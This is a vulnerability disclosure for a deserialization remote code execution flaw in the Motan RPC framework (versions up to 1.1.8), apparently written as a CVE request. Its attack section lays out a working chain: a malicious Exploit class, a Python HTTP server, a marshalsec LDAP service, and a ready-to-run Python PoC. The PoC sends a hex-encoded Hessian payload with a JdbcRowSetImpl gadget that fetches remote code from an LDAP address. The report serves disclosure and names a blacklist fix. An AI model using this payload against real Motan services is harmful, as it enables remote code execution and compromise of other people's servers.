# MOTAN RCE



## Vulnerability title

Motan version <=1.18 RPC framework has deserialization command execution vulnerability



## Affected version

Motan version <=1.18 

​	

##  Discoverer

Alibaba Security  @yangjie



## analysis report

### Vulnerability testing environment

https://github.com/plr47/CVE_REQUEST/tree/master/Mine/Motan/testmotan



### Vulnerability description

This vulnerability can affect all Motan users stay on version 1.1.8 or lower. An attacker can send RPC requests with unrecognized malicious parameter payloads. When the malicious parameter is deserialized, it will execute some malicious code. More details can be found below.



### Gadgets dependency for testing

```
<dependency>
     <groupId>com.rometools</groupId>
     <artifactId>rome</artifactId>
     <version>1.7.0</version>
 </dependency>
```

### Attack process

- Download source code https://github.com/plr47/CVE_REQUEST/tree/master/Mine/Motan/testmotan

- Run under IDEA `Server.java`

- Construct an LDAP service
  （1）Write malicious classes and `javac Exploit.java`
  ![image](https://tva1.sinaimg.cn/large/007S8ZIlly1ggbhfn9diuj30uc0co760.jpg)
  （2）Open a server with python
  ![image](https://tva1.sinaimg.cn/large/007S8ZIlly1ggbhgy0l9xj30r805ijsw.jpg)
  （3）`marshalsec`
  ![image](https://tva1.sinaimg.cn/large/007S8ZIlly1ggbhhn2sfyj315s04a3z6.jpg)

- POC

  ```python
  import socket
  import time
  import re
  
  def sendEvilObjData(sock):
      payload = "f1f1000017405557170000010000034df0f0010017405557170000010000033daced0005772e0015717569636b73746172742e466f6f536572766963650003776f6300106a6176612e6c616e672e4f626a656374757200025b42acf317f8060854e002000078700000028d48433027636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e457175616c734265616e92096265616e436c617373036f626a60430f6a6176612e6c616e672e436c61737391046e616d65613029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e433029636f6d2e726f6d65746f6f6c732e726f6d652e666565642e696d706c2e546f537472696e674265616e92096265616e436c617373036f626a62611d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706c431d636f6d2e73756e2e726f777365742e4a646263526f77536574496d706cac07636f6d6d616e640355524c0a64617461536f757263650a726f77536574547970650b73686f7744656c657465640c717565727954696d656f7574076d6178526f77730c6d61784669656c6453697a650b636f6e63757272656e637908726561644f6e6c791065736361706550726f63657373696e670969736f6c6174696f6e08666574636844697209666574636853697a6504636f6e6e02707302727306726f77734d44057265734d440d694d61746368436f6c756d6e730f7374724d61746368436f6c756d6e730c62696e61727953747265616d0d756e69636f646553747265616d0b617363696953747265616d0a6368617253747265616d036d6170096c697374656e65727306706172616d73634e4e1d6c6461703a2f2f3132372e302e302e313a393939392f4578706c6f6974cbec46909090cbf0545492cbe8904e4e4e4e4e56106a6176612e7574696c2e566563746f729a8f8f8f8f8f8f8f8f8f8f56909a03666f6f4e4e4e4e4e4e4e4e4e4e4e4e4e4e4e4d136a6176612e7574696c2e486173687461626c655a5191519151915a776300000005000b6170706c69636174696f6e00056d6f74616e000b636c69656e7447726f7570000b64656661756c745f72706300066d6f64756c6500056d6f74616e000776657273696f6e0003312e30000567726f7570000b64656661756c745f727063"
      sock.send(payload.decode('hex'))
  def run(dip,dport):
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      server_addr = (dip, dport)
      sock.connect(server_addr)
      sendEvilObjData(sock)
  
  run("127.0.0.1",8002)
  ```

- Successful attack after execution poc

![img](https://tva1.sinaimg.cn/large/007S8ZIlly1gi94seg4sdj30xu0lq4g1.jpg)

## repair plan
Add Hessian's deserialization blacklist


